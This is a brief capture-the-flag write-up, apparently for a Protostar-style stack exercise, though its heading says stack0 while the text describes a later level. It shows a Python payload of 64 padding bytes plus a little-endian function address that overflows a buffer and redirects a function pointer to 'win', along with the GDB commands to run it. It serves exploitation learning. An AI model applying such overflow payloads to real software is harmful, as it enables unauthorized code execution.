# Stack0

The code for this one is identitcal to stack0. The difference between stack0 and this one is that this version requires us to redirect a function pointer call to the goal.
We first need the function address, so we call it using 
```
x win
```
and we get 0x8048424 as the function address. Our goal would be to overwrite the buffer so that the fp variable is equal to this.

The solution input is:

```python
buffer = ("A"*64)
buffer += "\x24\x84\x04\x08" # 0x8048424
print(buffer)
```
Run 
```
python stack.py > exp
```

Feed it into GDB using r < /tmp/exp
